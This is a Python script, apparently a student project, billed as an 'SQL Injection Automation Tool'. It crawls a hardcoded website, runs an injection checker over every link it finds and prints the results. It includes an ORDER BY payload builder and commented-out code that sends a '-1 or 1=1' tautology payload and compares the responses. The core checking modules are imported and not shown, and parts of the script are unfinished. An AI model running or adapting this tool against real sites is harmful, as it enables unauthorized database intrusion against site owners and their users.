import crawling as cr
import qchecker as qc
import chardet
import requests
import argparse


def makeOrderBy(num):
    return " order by "+str(num)+"#"

if __name__=="__main__":

    parser = argparse.ArgumentParser(description= "Echo client -p port -i host -s string")
    parser.add_argument('-u', help="URL", required=False)
    parser.add_argument('-t', help="dept", required=False)
    parser.add_argument('-m', help="Mode", required=False)
    parser.add_argument('-s', help="input_string", nargs='+', required=False)


    print("\n")
    print("           _____ ____    __         __________  __  _______  ___   _____")
    print("          / ___// __ \  / /        / ____/ __ \/  |/  / __ \/   | / ___/")
    print("          \__ \/ / / / / /  ______/ /   / / / / /|_/ / /_/ / /| | \__ \\")
    print("         ___/ / /_/ / / /__/_____/ /___/ /_/ / /  / / ____/ ___ |___/ /")
    print("        /____/\___\_\/_____/     \____/\____/_/  /_/_/   /_/  |_/____/")
    print ("                     SQL Injection Automation Tool V.0.01")
    print ("                          by KSJ 5th /Team Dragon Compass\n\n\n") 
    
    baseurl1 = "http://mentoring.ton80.net/"

    # baseurl1 = "http://pingu6615.phps.kr/ksj/"

    page1 = cr.getinfo(baseurl1)
    page1.showdata()    
    # qc.checkVOper(page1.hreflist[0])

    for s in page1.hreflist:
        qc.checkVOper(s)

    print(qc.makeResult())

    # if qc.checkNormal(page1.hreflist[0],['1323') : 
    #     print("this query has normal results")
    # else :
    #     print("this query has anormal results")

    # i = page1.hreflist[0]
    # for q in qlist :
    #     tmp1,tmp2 = i.classmember(q)
    #     res.append({'text':tmp1 , 'code':tmp2, 'qy' : q})
    # for j in res :  # check error 
    #     if j['code'] == 200 :
    #         if not any(word in j['text'] for word in error ) :
    #             pres.append({ 'text' : j['text'], 'qy' : j['qy']})

    # for i in range(0,len(pres)) :
    #     for j in range(0,len(pres)) :
    #         if i != j :
    #             tres = cr.show_diff(pres[i]['text'],pres[j]['text']) 
    #             for k in tres[1] : 
    #                 if (pres[i]['qy'] != k ) and (pres[j]['qy'] != k ):
    #                     print(tres[0],tres[1])

    # for i in page1.hreflist:
    #         i.classmember('-1 or 1=1')  
